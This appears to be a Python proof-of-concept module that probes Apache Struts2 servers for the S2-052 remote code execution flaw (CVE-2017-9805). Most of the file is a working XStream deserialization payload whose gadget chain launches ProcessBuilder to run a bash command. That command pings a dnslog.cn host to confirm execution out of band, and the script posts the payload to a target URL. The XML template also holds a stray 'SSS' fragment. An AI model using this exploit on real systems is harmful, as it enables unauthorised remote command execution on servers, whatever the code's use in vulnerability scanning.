# coding:utf-8
import requests
import sys
import base64
requests.packages.urllib3.disable_warnings()

class c2Class(object):
	def __init__(self):
		self.vulname = 'S2-052 rce'
		self.cveid='CVE-2017-9805'
		self.vulsystem= 'Struts2'
		self.vulversion = 'Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12'
		self.findtime='2017'
		self.refer= 'https://github.com/Vancir/s2-052-reproducing/blob/master/exploit.py'
		self.testisok=True

		self.vulpath='/orders/3/edit'
		self.payload= '''
		<map>
		<entry>
		<jdk.nashorn.internal.objects.NativeString>
		<flags>0</flags>
		<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
		<dataHandler>
		<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
		<is class="javax.crypto.CipherInputStream">
		<cipher class="javax.crypto.NullCipher">
		<initialized>false</initialized>
		<opmode>0</opmode>
		<serviceIterator class="javax.imageio.spi.FilterIterator">
		<iter class="javax.imageio.spi.FilterIterator">
		<iter class="java.util.Collections$EmptyIterator"/>
		<next class="java.lang.ProcessBuilder">
		<command>
		<string>bash</string>SSS
		<string>-c</string>
		<string>ping {0}.{1}</string>
		</command>
		<redirectErrorStream>false</redirectErrorStream>
		</next>
		</iter>
		<filter class="javax.imageio.ImageIO$ContainsFilter">
		<method>
		<class>java.lang.ProcessBuilder</class>
		<name>start</name>
		<parameter-types/>
		</method>
		<name>foo</name>
		</filter>
		<next class="string">foo</next>
		</serviceIterator>
		<lock/>
		</cipher>
		<input class="java.lang.ProcessBuilder$NullInputStream"/>
		<ibuffer/>
		<done>false</done>
		<ostart>0</ostart>
		<ofinish>0</ofinish>
		<closed>false</closed>
		</is>
		<consumed>false</consumed>
		</dataSource>
		<transferFlavors/>
		</dataHandler>
		<dataLen>0</dataLen>
		</value>
		</jdk.nashorn.internal.objects.NativeString>
		<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
		</entry>
		<entry>
		<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
		<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
		</entry>
		</map>'''
		self.headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0',
		'Content-Type': 'application/xml'}
		self.dnslog='0suqc9.dnslog.cn'
		self.flag1=500
		self.flag2='java.security.Provider$Service'

	def c2Func(self,target):
		status=0
		returnData=''
		if target.startswith(('http://','https://')):
			pass
		else:
			target='http://'+target
		try:
			url=target.strip('/')+self.vulpath
			data=self.payload.format(base64.b64encode('192.168.3.11:8080').strip('='),
				self.dnslog)
			resp=requests.post(url=url,headers=self.headers,data=data,timeout=2)
			if self.flag1 == resp.status_code or self.flag2 in resp.text:
				returnData='%s is bad.The vuln is S2-052 rce (CVE-2017-9805).Please check dnslog in %s'%(target,self.dnslog)
				status=1
		except Exception as e:
			returnData=str(e)
		return status,returnData

if __name__ == '__main__':
	target='http://192.168.3.12:8081/'
	pocObj=c2Class()
	print(pocObj.c2Func(target))